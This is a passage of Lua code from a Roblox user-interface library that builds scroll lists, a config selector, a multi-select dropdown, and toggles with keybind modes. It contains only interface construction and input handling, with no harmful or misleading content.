										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 

										Element.value.Scroll = v 

										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									Button.MouseEnter:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
										end 
									end) 
									Button.MouseLeave:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end) 
								end 

								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value
								
								
								
								
								
								
								
								
								
								
								
								
								
								
							elseif type == "cfgtype" then 
							local amount = data.Amount or 6 
								Section.Size = Section.Size + C.UDIM2(0,0,0,amount * 16 + 8) 
								if data.alphabet then 
									C.TBLSORT(data.options, function(a,b) 
										return a < b 
									end) 
								end 
								Element.value = {Scroll = data.default and data.default.Scroll or data.options[1]}

								local Scroll = C.INST("Frame") 
								local Frame = C.INST("ScrollingFrame") 
								local UIListLayout = C.INST("UIListLayout") 

								Scroll.Name = "Scroll" 
								Scroll.Parent = Inner 
								Scroll.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Scroll.BackgroundTransparency = 1.000 
								Scroll.Position = C.UDIM2(0, 0, 00, 0) 
								Scroll.Size = C.UDIM2(1, 0, 0, amount * 16 + 8) 


								Frame.Name = "Frame" 
								Frame.Parent = Scroll --  
								Frame.Active = true 
								Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Frame.Position = C.UDIM2(0, 30, 0, 0) 
								Frame.Size = C.UDIM2(0, 175, 0, 16 * amount) 
								Frame.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Frame.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.ScrollBarThickness = 4 
								Frame.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Frame.AutomaticCanvasSize = "Y" 
								Frame.ScrollBarImageColor3 = MainUIColor 
function MenuAccent(color)
Frame.ScrollBarImageColor3 = color
end
								UIListLayout.Parent = Frame 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
								local first = true 
ConfigUpdateCfgList:Connect(function()
								for i,v in ipairs(data.options) do 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 

									Button.Name = v 
									Button.Parent = Frame 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.BorderSizePixel = 0 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(1, 0, 0, 16) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 4, 0, -1) 
									TextLabel.Size = C.UDIM2(1, 1, 1, 1) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = v 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
									if first then first = false 
										TextLabel.TextColor3 = MainUIColor 
--[[function MenuAccent(color)
TextLabel.TextColor3 = color
end--]]
									end 
 ConfigUpdateCfgList2:Connect(function()
Button:Destroy()
TextLabel:Destroy()
end)
									Button.MouseButton1Down:Connect(function() 

										for i,v in pairs(Frame:GetChildren()) do 
											if v:IsA("TextButton") then 
												library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end 

										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 

										Element.value.Scroll = v 

										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end) 
									Button.MouseEnter:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
										end 
									end) 
									Button.MouseLeave:Connect(function() 
										if Element.value.Scroll ~= v then 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end) 
								end
end)
ConfigUpdateCfgList:Fire()

								function Element:SetValue(val) 
									Element.value = val 

									for i,v in pairs(Frame:GetChildren()) do 
										if v:IsA("TextButton") then 
											library:Tween(v.TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
									end 

									library:Tween(Frame[Element.value.Scroll].TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 
								values[tabname][sectorname][text] = Element.value								
							elseif type == "Jumbobox" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,39) 
								Element.value = {Jumbobox = {}} 
								data.options = data.options or {} 

								local Dropdown = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local TextLabel = C.INST("TextLabel") 
								local Drop = C.INST("ScrollingFrame") 
								local Button_2 = C.INST("TextButton") 
								local TextLabel_2 = C.INST("TextLabel") 
								local UIListLayout = C.INST("UIListLayout") 
								local ImageLabel = C.INST("ImageLabel") 
								local TextLabel_3 = C.INST("TextLabel") 

								Dropdown.Name = "Dropdown" 
								Dropdown.Parent = Inner 
								Dropdown.BackgroundColor3 = C.COL3RGB(33, 35, 255) 
								Dropdown.BackgroundTransparency = 1.000 
								Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
								Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

								Button.Name = "Button" 
								Button.Parent = Dropdown 
								Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Button.Position = C.UDIM2(0, 30, 0, 16) 
								Button.Size = C.UDIM2(0, 175, 0, 17) 
								Button.AutoButtonColor = false 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
								TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
								TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = "..." 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local abcd = TextLabel 

								Drop.Name = "Drop" 
								Drop.Parent = Button 
								Drop.Active = true 
								Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Drop.Position = C.UDIM2(0, 0, 1, 1) 
								Drop.Size = C.UDIM2(1, 0, 0, 20) 
								Drop.Visible = false 
								Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.CanvasSize = C.UDIM2(0, 0, 0, 0) 
								Drop.ScrollBarThickness = 4 
								Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
								Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
								--Drop.AutomaticCanvasSize = "Y" 
								for i,v in pairs(data.options) do 
									Drop.CanvasSize = Drop.CanvasSize + C.UDIM2(0, 0, 0, 17) 
								end 
								Drop.ZIndex = 5 
								Drop.ScrollBarImageColor3 = MainUIColor 

								UIListLayout.Parent = Drop 
								UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
								UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

								values[tabname][sectorname][text] = Element.value 

								local num = #data.options 
								if num > 5 then 
									Drop.Size = C.UDIM2(1, 0, 0, 85) 
								else 
									Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
								end 
								local first = true 

								local function updatetext() 
									local old = {} 
									for i,v in ipairs(data.options) do 
										if C.TBLFIND(Element.value.Jumbobox, v) then 
											C.INSERT(old, v) 
										else 
										end 
									end 
									local str = "" 


									if #old == 0 then 
										str = "..." 
									else 
										if #old == 1 then 
											str = old[1] 
										else 
											for i,v in ipairs(old) do 
												if i == 1 then 
													str = v 
												else 
													if i > 2 then 
														if i < 4 then 
															str = str..",  ..." 
														end 
													else 
														str = str..",  "..v 
													end 
												end 
											end 
										end 
									end 

									abcd.Text = str 
								end 
								for i,v in ipairs(data.options) do 
									do 
										local Button = C.INST("TextButton") 
										local TextLabel = C.INST("TextLabel") 

										Button.Name = v 
										Button.Parent = Drop 
										Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Button.Position = C.UDIM2(0, 30, 0, 16) 
										Button.Size = C.UDIM2(0, 175, 0, 17) 
										Button.AutoButtonColor = false 
										Button.Font = Enum.Font.SourceSans 
										Button.Text = "" 
										Button.TextColor3 = C.COL3RGB(0, 0, 0) 
										Button.TextSize = 11.000
										Button.BorderSizePixel = 0 
										Button.ZIndex = 6 

										TextLabel.Parent = Button 
										TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
										TextLabel.BackgroundTransparency = 1.000 
										TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
										TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
										TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
										TextLabel.Font = Enum.Font.Gotham 
										TextLabel.Text = v 
										TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
										TextLabel.TextSize = 11.000
										TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
										TextLabel.ZIndex = 6 

										Button.MouseButton1Down:Connect(function() 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												for i,a in pairs(Element.value.Jumbobox) do 
													if a == v then 
														TBLREMOVE(Element.value.Jumbobox, i) 
													end 
												end 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
											else 
												C.INSERT(Element.value.Jumbobox, v) 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
											end 
											updatetext() 

											values[tabname][sectorname][text] = Element.value 
											callback(Element.value) 
										end) 
										Button.MouseEnter:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
											end 
										end) 
										Button.MouseLeave:Connect(function() 
											if not C.TBLFIND(Element.value.Jumbobox, v) then 
												library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
											end 
										end) 

										first = false 
									end 
								end 
								function Element:SetValue(val) 
									Element.value = val 
									for i,v in pairs(Drop:GetChildren()) do 
										if v.Name ~= "UIListLayout" then 
											if C.TBLFIND(val.Jumbobox, v.Name) then 
												v.TextLabel.TextColor3 = MainUIColor 
											else 
												v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											end 
										end 
									end 
									updatetext() 
									values[tabname][sectorname][text] = Element.value 
									callback(val) 
								end 
								if data.default then 
									Element:SetValue(data.default) 
								end 

								ImageLabel.Parent = Button 
								ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								ImageLabel.BackgroundTransparency = 1.000 
								ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
								ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
								ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

								TextLabel_3.Parent = Dropdown 
								TextLabel_3.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel_3.BackgroundTransparency = 1.000 
								TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
								TextLabel_3.Font = Enum.Font.Gotham 
								TextLabel_3.Text = text 
								TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel_3.TextSize = 11.000
								TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

								Button.MouseButton1Down:Connect(function() 
									Drop.Visible = not Drop.Visible 
									if not Drop.Visible then 
										Drop.CanvasPosition = C.Vec2(0,0) 
									end 
								end) 
								local indrop = false 
								local ind = false 
								Drop.MouseEnter:Connect(function() 
									indrop = true 
								end) 
								Drop.MouseLeave:Connect(function() 
									indrop = false 
								end) 
								Button.MouseEnter:Connect(function() 
									ind = true 
								end) 
								Button.MouseLeave:Connect(function() 
									ind = false 
								end) 
								game:GetService("UserInputService").InputBegan:Connect(function(input) 
									if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
										if Drop.Visible == true and not indrop and not ind then 
											Drop.Visible = false 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end 
								end) 
							elseif type == "ToggleKeybind" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Toggle = data.default and data.default.Toggle or false, Key = data.default and data.default.Key or nil, Type = "Always", Active = true} 
								Element.value.Key = data.default and data.default.Key or nil
								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 
								local binding = false 
								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										keybindremove(text, Element.value.Key) 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end 

								Button.MouseButton1Down:Connect(function() 
									if not binding then 
										Element.value.Toggle = not Element.value.Toggle 
										update() 
										if Element.value.Key ~= nil and Element.value.Toggle then 
											keybindadd(text, Element.value.Key) 
										end 
										values[tabname][sectorname][text] = Element.value 
										callback(Element.value) 
									end 
								end) 
								if data.default then 
									update() 
								end 
								values[tabname][sectorname][text] = Element.value 
								do 
									local Keybind = C.INST("TextButton") 
									local Frame = C.INST("Frame") 
									local Always = C.INST("TextButton") 
									local UIListLayout = C.INST("UIListLayout") 
									local Hold = C.INST("TextButton") 
									local Toggle = C.INST("TextButton") 
									local ButtonKey = C.INST('TextButton')

									Keybind.Name = "Keybind" 
									Keybind.Parent = Button 
									Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
									Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
									Keybind.Text = data.default and data.default.Key or 'none'
									Keybind.Size = C.UDIM2(0, 43, 0, 12) 
									Keybind.Size = C.UDIM2(0,txt:GetTextSize("NONE", 14, Enum.Font.SourceSansSemibold, C.Vec2(700, 12)).X + 5,0, 12)
									Keybind.AutoButtonColor = false 
									Keybind.Font = Enum.Font.Gotham 
									Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
									Keybind.TextSize = 11.000
									Keybind.AnchorPoint = C.Vec2(1,0) 
									Keybind.ZIndex = 3 

									Frame.Parent = Keybind 
									Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Frame.Position = C.UDIM2(1, -49, 0, 1) 
									Frame.Size = C.UDIM2(0, 49, 0, 49) 
									Frame.Visible = false 
									Frame.ZIndex = 3 

									Always.Name = "Always" 
									Always.Parent = Frame 
									Always.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Always.BackgroundTransparency = 1.000 
									Always.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Always.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Always.Size = C.UDIM2(1, 0, 0, 16) 
									Always.AutoButtonColor = false 
									Always.Font = Enum.Font.SourceSansBold 
									Always.Text = "Always" 
									Always.TextColor3 = C.COL3RGB(173, 24, 72) 
									Always.TextSize = 11.000
									Always.ZIndex = 3 

									UIListLayout.Parent = Frame 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									Hold.Name = "Hold" 
									Hold.Parent = Frame 
									Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Hold.BackgroundTransparency = 1.000 
									Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Hold.Size = C.UDIM2(1, 0, 0, 16) 
									Hold.AutoButtonColor = false 
									Hold.Font = Enum.Font.Gotham 
									Hold.Text = "Hold" 
									Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
									Hold.TextSize = 11.000
									Hold.ZIndex = 3 

									Toggle.Name = "Toggle" 
									Toggle.Parent = Frame 
									Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
									Toggle.Size = C.UDIM2(1, 0, 0, 16) 
									Toggle.AutoButtonColor = false 
									Toggle.Font = Enum.Font.Gotham 
									Toggle.Text = "Toggle" 
									Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
									Toggle.TextSize = 11.000
									Toggle.ZIndex = 3 

									for _,button in pairs(Frame:GetChildren()) do 
										if button:IsA("TextButton") then 
											button.MouseButton1Down:Connect(function() 
												Element.value.Type = button.Text 
												Frame.Visible = false 
												if Element.value.Active ~= (Element.value.Type == "Always" and true or false) then 
													Element.value.Active = Element.value.Type == "Always" and true or false 
													callback(Element.value) 
												end 
												if button.Text == "Always" then 
													keybindremove(text, Element.value.Key) 
												end 
												for _,button in pairs(Frame:GetChildren()) do 
													if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
														button.Font = Enum.Font.Gotham 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end 
												button.Font = Enum.Font.SourceSansBold 
												button.TextColor3 = C.COL3RGB(173, 24, 74) 
												values[tabname][sectorname][text] = Element.value 
											end) 
											button.MouseEnter:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
												end 
											end) 
											button.MouseLeave:Connect(function() 
												if Element.value.Type ~= button.Text then 
													library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
												end 
											end) 
										end 
									end 
									Keybind.MouseButton1Down:Connect(function() 
										if not binding then 
											wait() 
											binding = true
											Keybind.Text = "..." 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
										end 
									end) 
									Keybind.MouseButton2Down:Connect(function() 
										if not binding then 
											Frame.Visible = not Frame.Visible 
										end 
									end) 
									local Player = game.Players.LocalPlayer 
									local Mouse = Player:GetMouse() 
									local InFrame = false 
									Frame.MouseEnter:Connect(function() 
										InFrame = true 
									end) 
									Frame.MouseLeave:Connect(function() 
										InFrame = false 
									end) 
									local InFrame2 = false 
									Keybind.MouseEnter:Connect(function() 
										InFrame2 = true 
									end) 
									Keybind.MouseLeave:Connect(function() 
										InFrame2 = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
											if Frame.Visible == true and not InFrame and not InFrame2 then 
												Frame.Visible = false 
											end 
										end 
										if binding then 
											binding = false 
											Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
											Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
											Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
											if Element.value.Key ~= nil and Element.value.Toggle then 
												keybindadd(text, Element.value.Key) 
											end 
											if input.KeyCode.Name == "Backspace" then 
												Keybind.Text = "none" 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
												Element.value.Key = nil 
												Element.value.Active = true 
												keybindremove2(text)
											end 
											callback(Element.value) 
										else 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = true 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														elseif Element.value.Type == "Toggle" then 
															Element.value.Active = not Element.value.Active 
															callback(Element.value) 
															if Element.value.Active and Element.value.Toggle then 
																keybindtoggle(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end
														end 
														
													end 
												end 
											else 
												Element.value.Active = true 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
									game:GetService("UserInputService").InputEnded:Connect(function(input) 
										if Element.value.Key ~= nil then 
											if C.FIND(Element.value.Key, "Mouse") then 
												if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											else 
												if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
													if Element.value.Type == "Hold" then 
														Element.value.Active = false 
														callback(Element.value) 
														if Element.value.Active then 
															keybindhold(text)
														else 
															keybindremove(text, Element.value.Key) 
														end 
													end 
												end 
											end 
										end 
										values[tabname][sectorname][text] = Element.value 
									end) 
								end 
								function Element:SetValue(value) 
									Element.value = value 
									update() 
									if Element.value.Toggle and Element.value.Key ~= nil then
										keybindadd(text, Element.value.Key)
									end
								end 
							elseif type == "Toggle" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Toggle = data.default and data.default.Toggle or false} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
								local Color = C.INST("Frame") 
								local TextLabel = C.INST("TextLabel") 

								Toggle.Name = "Toggle" 
								Toggle.Parent = Inner 
								Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Toggle.BackgroundTransparency = 1.000 
								Toggle.Size = C.UDIM2(1, 0, 0, 15) 

								Button.Name = "Button" 
								Button.Parent = Toggle 
								Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								Button.BackgroundTransparency = 1.000 
								Button.Size = C.UDIM2(1, 0, 1, 0) 
								Button.Font = Enum.Font.SourceSans 
								Button.Text = "" 
								Button.TextColor3 = C.COL3RGB(0, 0, 0) 
								Button.TextSize = 11.000

								Color.Name = "Color" 
								Color.Parent = Button 
								
								Color.BackgroundColor3 = MainUIColor
	function MenuAccent(color)
Color.BackgroundColor3 = color
end						
								Color.BackgroundColor3 = C.COL3RGB(46, 46, 46)
								Color.BorderColor3 = C.COL3RGB(18, 18, 16) 
								Color.Position = C.UDIM2(0, 15, 0.5, -5) 
								Color.Size = C.UDIM2(0, 8, 0, 8) 

								TextLabel.Parent = Button 
								TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
								TextLabel.BackgroundTransparency = 1.000 
								TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
								TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
								TextLabel.Font = Enum.Font.Gotham 
								TextLabel.Text = text 
								TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
								TextLabel.TextSize = 11.000
								TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

								local function update() 
									if Element.value.Toggle then 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
									else 
										tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
										library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									end 
									values[tabname][sectorname][text] = Element.value 
								end 

								Button.MouseButton1Down:Connect(function() 
									Element.value.Toggle = not Element.value.Toggle 
									update() 
									values[tabname][sectorname][text] = Element.value 
									callback(Element.value) 
								end) 
								if data.default then 
									update() 
								end 
								values[tabname][sectorname][text] = Element.value 
								function Element:SetValue(value) 
									Element.value = value 
									values[tabname][sectorname][text] = Element.value 
									update() 
									callback(Element.value) 
								end 
							elseif type == "ToggleColor" then 
								Section.Size = Section.Size + C.UDIM2(0,0,0,16) 
								Element.value = {Rainbow = false, RainbowSpeed = 3, Toggle = data.default and data.default.Toggle or false, Color = data.default and data.default.Color or C.COL3RGB(255,255,255), SetColor} 

								local Toggle = C.INST("Frame") 
								local Button = C.INST("TextButton") 
